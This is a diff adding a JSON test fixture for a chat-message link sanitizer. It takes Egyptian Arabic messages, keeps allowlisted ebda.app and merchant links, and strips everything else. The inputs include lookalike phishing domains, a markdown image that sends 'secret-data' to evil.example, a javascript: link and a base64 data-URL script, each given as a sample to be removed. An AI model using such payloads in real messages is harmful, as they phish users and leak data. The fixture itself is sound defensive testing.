@@ -1,0 +1,21 @@
+{
+  "cases": [
+    { "in": "شوف https://help.ebda.app/custom-domain/ دلوقتي", "out": "شوف <https://help.ebda.app/custom-domain/|https://help.ebda.app/custom-domain/> دلوقتي" },
+    { "in": "اقرا [الدليل](https://help.ebda.app/en/coupons/) كمان", "out": "اقرا <https://help.ebda.app/en/coupons/|الدليل> كمان" },
+    { "in": "ادخل https://ebda.app.evil.com/login", "out": "ادخل " },
+    { "in": "[اضغط هنا](https://ebda.app.evil.com/x) بسرعة", "out": "اضغط هنا بسرعة" },
+    { "in": "https://evil.com/?u=https://ebda.app", "out": "" },
+    { "in": "![x](https://evil.example/p?d=secret-data)", "out": "x" },
+    { "in": "شوف ![شعار](https://ebda.app/logo.png) ده", "out": "شوف شعار ده" },
+    { "in": "متجرك https://ameliaaurum.com/products", "merchant": ["ameliaaurum.com"], "out": "متجرك <https://ameliaaurum.com/products|https://ameliaaurum.com/products>" },
+    { "in": "متجرك https://shop.ameliaaurum.com/p.", "merchant": ["ameliaaurum.com"], "out": "متجرك <https://shop.ameliaaurum.com/p|https://shop.ameliaaurum.com/p>." },
+    { "in": "متجرك https://evilameliaaurum.com/p", "merchant": ["ameliaaurum.com"], "out": "متجرك " },
+    { "in": "ادخل http://ebda.app/login", "out": "ادخل " },
+    { "in": "[x](javascript:alert(1)) وكمان", "out": "x وكمان" },
+    { "in": "[x](data:text/html;base64,PHNjcmlwdD4=) تمام", "out": "x تمام" },
+    { "in": "https://ebda.app@evil.com/x", "out": "" },
+    { "in": "https://ebda.app:8443/x", "out": "" },
+    { "in": "https://EBDA.APP/Path", "out": "<https://EBDA.APP/Path|https://EBDA.APP/Path>" },
+    { "in": "كلام عادي من غير لينكات", "out": "كلام عادي من غير لينكات" }
+  ]
+}
